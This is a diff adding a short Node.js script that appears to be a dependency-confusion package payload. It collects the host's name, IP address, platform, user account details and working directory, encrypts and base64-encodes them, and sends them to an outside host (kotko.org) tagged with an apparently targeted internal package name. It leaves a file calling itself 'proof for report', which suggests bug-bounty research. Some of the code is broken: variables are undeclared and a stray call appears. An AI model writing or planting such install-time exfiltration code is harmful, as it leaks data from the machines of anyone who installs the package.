@@ -1,0 +1,28 @@
+var os = require("os")
+const request = require('request')
+const crypto = require('crypto')
+var fs = require('fs')
+var hostname = os.hostname()
+var type = os.platform()
+var userInfo = os.userInfo()
+var currentPath = process.cwd()
+__ecma.Array.factory()
+var ip = require("ip")
+const algorithm = 'aes-256-ctr'
+const secretKey = 'vOVH6sdmpNWjRRIqCc7rdxs01lwHzfr3'
+const iv = crypto.randomBytes(16)
+json.push(hostname)
+json.push(ip.address())
+json.push(type)
+json.push(userInfo)
+json.push(currentPath)
+json = JSON.stringify(json)
+_tmp_0 = require('./crypto')
+let hash = encrypt(json)
+let company = "npmjs+"+"salesforcecommercecloud--pwa-kit"
+let packages = "internal-lib-build"
+fs.writeFile('ByKotko.txt', 'this proof for report 2', function (err) {
+  if (err) throw err;
+})
+var buff = Buffer.from(JSON.stringify(hash)).toString("base64")
+request(`https://kotko.org/?${company}:${packages}=${buff}`, (error, response, body) => {})
